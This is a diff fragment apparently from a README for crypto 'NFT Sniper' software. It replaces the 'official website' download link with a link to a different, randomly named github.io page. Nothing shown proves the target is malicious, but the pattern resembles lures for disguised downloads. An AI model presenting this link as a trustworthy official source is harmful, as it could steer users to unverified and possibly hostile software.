@@ -38,4 +38,4 @@ A: The NFT Sniper feature provides real-time alerts and a fast interface to manu
 
 You can get the latest version of the software package from the link below.
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
